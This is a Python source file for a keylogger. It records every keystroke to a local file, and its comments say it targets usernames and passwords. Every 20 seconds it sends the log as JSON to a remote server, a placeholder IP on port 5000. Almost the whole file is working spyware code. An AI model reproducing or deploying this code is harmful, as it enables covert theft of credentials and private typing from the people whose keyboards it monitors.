from pynput import keyboard
from pynput import mouse
import datetime
import requests
import time

# when a key is pressed, action, or write key to file
def keyPressed(key):
    print(str(key))
    with open("keyfile.txt ", 'a') as logkey:

        # If user presses space, enter, or tab (assumes they are done with a word, sentace, username, or password), creates space or new line in logkey file
        if str(key).__eq__("Key.space"):
            logkey.write(" ")
        if str(key).__eq__("Key.enter"):
            logkey.write("\n")
        if str(key).__eq__("Key.tab"):
            logkey.write("\n")

        # creates char for key pressed, writes char to logkey file
        try:  
            char = key.char
            logkey.write(char)
        except:
            print("Error getting char")

### When mouse is pressed, if left mouse button pressed, create new line in logkey file ###
### Used for testing ###

# def mousePressed(int, int2, button, bool):
#    print(str(button))
#    with open("keyfile.txt ", 'a') as logkey:
#        if str(button).__eq__("Button.left") and bool == True:
#            logkey.write("\n")

# collects data, sends to private server
def collect_data():

    # creates data varaible that contains file contents
    try:
        with open("keyfile.txt", 'r') as keylog:
            dateAndTime = datetime.datetime.now()
            "Log Date and Time: " + str(dateAndTime)
            data = "Log Date and Time: " + str(dateAndTime) + "\n" + keylog.read()

        # private server, add local device IP to url variable
        url = "http://x.x.x.x:5000/receive-data"

        # send data to private server as post in json format
        response = requests.post(url, json={'data': data})
    
        return response.status_code
    except Exception as e:
        print(f"an error occurred: {e}")
        return None

# calls collect data every 20 seconds
def get_data():
    try:
        while True:
            status = collect_data()
            if status:
                print(f"Data sent, status code: {status}")
            else:
                print("Failed to send data.")
            
            time.sleep(20)
    except KeyboardInterrupt:
        print("Script terminated by user.")

# main, creates keyboard and mouse listener, starts listener, creates header for log, gets data, takes user inputs for logger
if __name__ == "__main__":

    open("keyfile.txt", "w").close()
    keyboardListener = keyboard.Listener(on_press=keyPressed)
    keyboardListener.start()

    # mouseListener = mouse.Listener(on_click=mousePressed)
    # mouseListener.start()

    get_data()

    input()
    

    



# Key.shift
# Key.caps_lock
# Key.tab
# Key.esc
# Key.f1
# Key.alt_gr
# Key.shift_r
# Key.enter
# Key.backspace
# Key.ctrl_l